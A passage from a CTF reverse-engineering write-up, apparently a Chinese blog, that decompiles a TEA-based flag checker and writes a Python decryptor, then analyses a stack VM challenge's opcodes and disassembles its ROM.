class="hljs-number">34</span>] = <span class="hljs-number">-53</span>;<br>  v5[<span class="hljs-number">35</span>] = <span class="hljs-number">92</span>;<br>  v5[<span class="hljs-number">36</span>] = <span class="hljs-number">43</span>;<br>  v5[<span class="hljs-number">37</span>] = <span class="hljs-number">33</span>;<br>  v5[<span class="hljs-number">38</span>] = <span class="hljs-number">-109</span>;<br>  qmemcpy(v6, <span class="hljs-string">&quot;ta&#125;&quot;</span>, <span class="hljs-keyword">sizeof</span>(v6));<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;plz input your flag:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%42s&quot;</span>, Str);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) != <span class="hljs-number">42</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong length&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">39</span>; i += <span class="hljs-number">8</span> )<br>    encrypt(&amp;Str[i], &amp;key);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">41</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( Str[i] != v5[i] )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;win&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>密钥key</p><p><img src="assets/2024-03-30-23-00-49-image.png"></p><p>tea算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">_DWORD *__fastcall <span class="hljs-title function_">encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *a1, _DWORD *a2)</span><br>&#123;<br>  _DWORD *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v6 = *a1;<br>  v5 = a1[<span class="hljs-number">1</span>];<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x1F</span>; ++i )<br>  &#123;<br>    v4 -= <span class="hljs-number">0x61C88647</span>;<br>    v6 += (v5 + v4) ^ (*a2 + <span class="hljs-number">16</span> * v5) ^ ((v5 &gt;&gt; <span class="hljs-number">5</span>) + a2[<span class="hljs-number">1</span>]);<br>    v5 += (v6 + v4) ^ (a2[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * v6) ^ ((v6 &gt;&gt; <span class="hljs-number">5</span>) + a2[<span class="hljs-number">3</span>]);<br>  &#125;<br>  *a1 = v6;<br>  result = a1 + <span class="hljs-number">1</span>;<br>  a1[<span class="hljs-number">1</span>] = v5;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接逆就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br>ans = [<br><span class="hljs-number">0x3687D089</span>, <span class="hljs-number">0xD0D945C9</span>, <span class="hljs-number">0x93363B71</span>, <span class="hljs-number">0x6301BF18</span>, <span class="hljs-number">0xF77E36A9</span>, <span class="hljs-number">0x821920FF</span>,<br><span class="hljs-number">0x8A7B77CD</span>, <span class="hljs-number">0x50223012</span>, <span class="hljs-number">0x5CCBA996</span>, <span class="hljs-number">0x7493212B</span>, <span class="hljs-number">0x00007D61</span><br>]<br><br>key = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x0BADF00D</span>, <span class="hljs-number">0x05201314</span>, <span class="hljs-number">0x87654321</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>):<br>    v6 = ans[i]<br>    v5 = ans[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0xc6ef3720</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>        v5 -= (v6 + <span class="hljs-built_in">sum</span>) ^ (key[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * v6) ^ ((v6 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>])<br>        v5 = (v5 + <span class="hljs-number">0x100000000</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v6 -= (v5 + <span class="hljs-built_in">sum</span>) ^ (key[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span> * v5) ^ ((v5 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>])<br>        v6 = (v6 + <span class="hljs-number">0x100000000</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + <span class="hljs-number">0x61C88647</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    ans[i] = v6<br>    ans[i+<span class="hljs-number">1</span>] = v5<br><br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> ans:<br>    flag += d.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Vm"><a href="#Vm" class="headerlink" title="Vm"></a>Vm</h2><p>虚拟机题，附件里面连符号都没去，很好分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">142</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-90h] BYREF</span><br>  __int16 v6; <span class="hljs-comment">// [rsp+8Eh] [rbp-2h]</span><br><br>  vm_init(&amp;vm, argv, envp);<br>  vm_load(&amp;vm, &amp;ctf_rom, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ctf_rom_len);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the flag: &quot;</span>);<br>  fgets(s, <span class="hljs-number">128</span>, <span class="hljs-built_in">stdin</span>);<br>  s[<span class="hljs-built_in">strlen</span>(s) - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-built_in">strlen</span>(s);<br>  vm_fill_input((__int64)&amp;vm, s, v3);<br>  v6 = vm_run(&amp;vm);<br>  <span class="hljs-keyword">if</span> ( v6 )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect flag!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Correct flag!&quot;</span>);<br>  <span class="hljs-keyword">return</span> v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>init_vm里面初始化了虚拟机PC，栈还有flag堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">vm_init</span><span class="hljs-params">(_QWORD *a1)</span><br>&#123;<br>  _QWORD *result; <span class="hljs-comment">// rax</span><br><br>  a1[<span class="hljs-number">0x1000</span>] = (<span class="hljs-type">char</span> *)a1 + <span class="hljs-number">4919</span>;               <span class="hljs-comment">// PC</span><br>  a1[<span class="hljs-number">0x1041</span>] = a1 + <span class="hljs-number">0x1001</span>;                     <span class="hljs-comment">// SP = &amp;BP</span><br>  result = a1;<br>  a1[<span class="hljs-number">0x1052</span>] = a1 + <span class="hljs-number">0x1042</span>;                     <span class="hljs-comment">// &amp;flag</span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>vm_load把rom加载到PC处</p><p>vm_fill_input把输入flag复制到虚拟机的flag堆里面</p><p>主要分析虚拟机主函数vm_run</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>          &#123;<br>            byte = vm_read_byte((__int64)a1);<br>            <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">0xA2</span> )<br>              <span class="hljs-keyword">break</span>;<br>            v9 = vm_pop((__int64)a1);<br>            v8 = v9 * vm_pop((__int64)a1);<br>            vm_push((__int64)a1, v8);<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( byte &gt; <span class="hljs-number">0xA2</span>u )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( byte == <span class="hljs-number">0x52</span> )<br>          &#123;<br>            v7 = vm_read_short((__int64)a1);<br>            <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int16)vm_pop((__int64)a1) )<br>              a1[<span class="hljs-number">0x1000</span>] = (<span class="hljs-type">char</span> *)a1 + v7;<br>          &#125;<br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte &gt; <span class="hljs-number">0x52</span>u )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( byte == <span class="hljs-number">0x66</span> )<br>            &#123;<br>              v5 = vm_pop((__int64)a1) + <span class="hljs-number">1</span>;<br>              vm_push((__int64)a1, v5);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">0x9B</span> )<br>                <span class="hljs-keyword">goto</span> LABEL_31;<br>              vm_pop((__int64)a1);<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">3</span> )<br>              <span class="hljs-keyword">goto</span> LABEL_31;<br>            v11 = vm_pop((__int64)a1);<br>            v10 = vm_pop((__int64)a1) ^ v11;<br>            vm_push((__int64)a1, v10);<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">0xCE</span> )<br>          <span class="hljs-keyword">break</span>;<br>        v6 = vm_pop((__int64)a1);<br>        vm_push((__int64)a1, v6);<br>        vm_push((__int64)a1, v6);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( byte &gt; <span class="hljs-number">0xCE</span>u )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( byte == <span class="hljs-number">0xA4</span> )<br>      &#123;<br>        v12 = vm_read_short((__int64)a1);<br>        vm_push((__int64)a1, v12);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">0xB1</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        <span class="hljs-keyword">if</span> ( (__int64)(a1[<span class="hljs-number">0x1052</span>] - (_QWORD)(a1 + <span class="hljs-number">0x1042</span>)) &gt; <span class="hljs-number">0x7F</span> )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">6</span>);<br>        v3 = (<span class="hljs-type">unsigned</span> __int8 *)a1[<span class="hljs-number">0x1052</span>];<br>        a1[<span class="hljs-number">0x1052</span>] = v3 + <span class="hljs-number">1</span>;<br>        vm_push((__int64)a1, *v3);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">0xDF</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v4 = vm_read_short((__int64)a1);<br>    <span class="hljs-keyword">if</span> ( a1 + <span class="hljs-number">0x1001</span> == (_QWORD *)a1[<span class="hljs-number">0x1041</span>] )<br>      a1[<span class="hljs-number">0x1000</span>] = (<span class="hljs-type">char</span> *)a1 + v4;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( byte != <span class="hljs-number">0xE1</span> )<br>LABEL_31:<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> __int16)vm_read_short((__int64)a1);<br></code></pre></td></tr></table></figure><p>分析虚拟机指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">vm[0x8000]      PC</span><br><span class="hljs-string">vm[0x8008]      BP</span><br><span class="hljs-string">vm[0x8208]      SP</span><br><span class="hljs-string">vm[0x8290]      &amp;flag</span><br><span class="hljs-string">vm[0x8210]      flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xA2    栈顶两个数相乘</span><br><span class="hljs-string">0x52    根据栈顶判断 跳转</span><br><span class="hljs-string">0x66    栈顶数加一</span><br><span class="hljs-string">0x9B    pop栈顶</span><br><span class="hljs-string">0x03    栈顶两个数异或</span><br><span class="hljs-string">0xCE    重复栈顶的数</span><br><span class="hljs-string">0xA4    push 立即数</span><br><span class="hljs-string">0xB1    push 1字节flag到栈</span><br><span class="hljs-string">0xDF    栈空跳转</span><br><span class="hljs-string">0xE1    return</span><br><span class="hljs-string">_       exit</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>把rom导出，解析一下rom代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python">pc = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> (pc &lt; <span class="hljs-built_in">len</span>(rom)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;pc&#125;</span>]&quot;</span>)<br>    op = rom[pc]<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">match</span> (op):<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop bx&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul ax, bx&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push ax&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x52</span>:<br>            l = rom[pc]<br>            h = rom[pc+<span class="hljs-number">1</span>]<br>            i = (h &lt;&lt; <span class="hljs-number">8</span>) | l<br>            i -= <span class="hljs-number">4919</span><br>            pc += <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test ax, ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;movz pc, <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x66</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;inc ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push ax&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9B</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop ax&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x03</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop bx&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor ax, bx&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push ax&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xCE</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pop ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push ax&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push ax&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA4</span>:<br>            l = rom[pc]<br>            h = rom[pc+<span class="hljs-number">1</span>]<br>            i = (h &lt;&lt; <span class="hljs-number">8</span>) | l<br>            pc += <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;push <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(i)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xB1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov ax, *flag++&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;push ax&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xDF</span>:<br>            l = rom[pc]<br>            h = rom[pc+<span class="hljs-number">1</span>]<br>            i = (h &lt;&lt; <span class="hljs-number">8</span>) | l<br>            i -= <span class="hljs-number">4919</span><br>            pc += <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test sp, bp&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;movz pc, <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xE1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ret rom[pc]&quot;</span>)<br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-number">0</span>]<br>push <span class="hljs-number">0x8205</span><br>[<span class="hljs-number">3</span>]<br>push <span class="hljs-number">0x102</span><br>[<span class="hljs-number">6</span>]<br>push <span class="hljs-number">0xa541</span><br>[<span class="hljs-number">9</span>]<br>push <span class="hljs-number">0xe6</span><br>[<span class="hljs-number">12</span>]<br>push <span class="hljs-number">0xa02d</span><br>[<span class="hljs-number">15</span>]<br>push <span class="hljs-number">0xdf</span><br>[<span class="hljs-number">18</span>]<br>push <span class="hljs-number">0xcb16</span><br>[<span class="hljs-number">21</span>]<br>push <span class="hljs-number">0x81</span><br>[<span class="hljs-number">24</span>]<br>push <span class="hljs-number">0xbc8f</span><br>[<span class="hljs-number">27</span>]<br>push <span class="hljs-number">0xa6</span><br>[<span class="hljs-number">30</span>]<br>push <span class="hljs-number">0xc0f6</span><br>[<span class="hljs-number">33</span>]<br>push <span class="hljs-number">0xa3</span><br>[<span class="hljs-number">36</span>]<br>push <span class="hljs-number">0xb06d</span><br>[<span class="hljs-number">39</span>]<br>push <span class="hljs-number">0xd2</span><br>[<span class="hljs-number">42</span>]<br>push <span class="hljs-number">0x9da4</span><br>[<span class="hljs-number">45</span>]<br>push <span class="hljs-number">0xe7</span><br>[<span class="hljs-number">48</span>]<br>push <span class="hljs-number">0xd2b9</span><br>[<span class="hljs-number">51</span>]<br>push <span class="hljs-number">0x7a</span><br>[<span class="hljs-number">54</span>]<br>push <span class="hljs-number">0xb47b</span><br>[<span class="hljs-number">57</span>]<br>push <span class="hljs-number">0xb3</span><br>[<span class="hljs-number">60</span>]<br>push <span class="hljs-number">0xcaf3</span><br>[<span class="hljs-number">63</span>]<br>push <span class="hljs-number">0x8c</span><br>[<span class="hljs-number">66</span>]<br>push <span 